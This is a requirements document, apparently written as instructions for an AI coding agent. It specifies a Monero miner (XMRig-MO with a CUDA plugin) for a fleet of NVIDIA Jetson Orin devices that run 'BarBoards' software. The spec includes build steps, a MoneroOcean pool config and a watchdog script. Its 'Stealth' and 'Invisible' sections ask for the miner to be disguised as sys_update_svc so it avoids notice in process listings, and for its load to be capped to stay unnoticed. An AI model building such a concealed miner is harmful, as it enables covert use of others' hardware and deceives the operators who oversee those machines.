# Requirements Document: Low-Priority Fleet Miner (LPFM)
## Target Hardware: NVIDIA Jetson Orin (AGX/NX/Nano)
## Operating System: Ubuntu 20.04 LTS (JetPack 5.x)
## Primary Goal: Background GPU mining for MoneroOcean (XMR) with strict resource fencing.

### 1. Core Architecture & Stack
Miner Base: XMRig-MO (MoneroOcean Fork) for CPU + XMRig-CUDA plugin for GPU.

Language: Bash (for orchestration) + JSON (for configuration).

Dependency Management: Must use existing CUDA libraries at /usr/local/cuda.

Architecture: aarch64 (ARM64). Standard x86 binaries will not work.

### 2. Technical Specifications
### 2.1 Algorithm Strategy
The miner must be configured for MoneroOcean Algo-Switching.

CPU Algorithm: Fixed to RandomX.

GPU Algorithms: Enabled for KawPow, Autolykos2, and cn-gpu.

Payout: All effort must be unified into the Monero (XMR) wallet address.

### 2.2 Resource Fencing (The "Invisible" Requirement)
To prevent the BarBoards software from lagging, the miner must adhere to these constraints:

GPU Load Cap: Max 50% utilization (GR3D_FREQ in tegrastats).

Process Priority: Run miner with nice -n 19 and ionice -c 3.

CPU Pinning: (Optional but Recommended) Bind the miner to the last 2 cores only, leaving the first cores completely clear for the BarBoards service.

Memory Limit: Miner must not exceed 2GB of Resident Set Size (RSS) to avoid OOM (Out of Memory) events on 4GB/8GB Orin models.

### 3. Implementation Steps for the AI Coder
### Step A: Dependency & Build
Install build tools: git, cmake, build-essential, libuv1-dev, libssl-dev, libhwloc-dev.

Clone https://github.com/MoneroOcean/xmrig.

Critical: Build with ARM optimization: cmake .. -DWITH_CUDA=ON.

Clone and build https://github.com/MoneroOcean/xmrig-cuda to generate libxmrig-cuda.so.

### Step B: The "Smart" Config.json
Generate a config.json that includes:

"autosave": true

"background": true

"cuda": { "enabled": true, "loader": "./libxmrig-cuda.so", "nvml": true }

"pools": Target gulf.moneroocean.stream:10128.

"user": [INSERT_WALLET_ADDRESS]

"pass": [WORKER_NAME]~[ALGO_HINT] (e.g., barboard-01~kawpow).

### Step C: The Watchdog Script
Create a monitor_health.sh script that:

Parses tegrastats output.

If CPU temperature > 80°C, kill the miner.

If BarBoards process CPU usage > 50%, pause the miner for 60 seconds.

Restart miner if it crashes.

### 4. Specific "Vibe" Constraints for the AI
Pathing: Use absolute paths (e.g., /home/nvidia/lpfm/) to ensure the miner runs correctly as a systemd service.

Stealth: The miner should be named sys_update_svc or similar in the process tree to avoid confusion during manual top inspections.

Non-Destructive: Do not modify /etc/nvpmodel.conf. Use nvpmodel -m [current] to check state but never force a change that might overwrite the BarBoards thermal profile.

### 5. Success Metrics
Verification: Miner appears on the MoneroOcean dashboard under the specified worker name.

Isolation: tegrastats shows GR3D_FREQ at ~50% and EMC_FREQ (Memory Controller) remains below 90% utilization.

Stability: Zero "Out of Memory" errors in dmesg over a 24-hour soak test.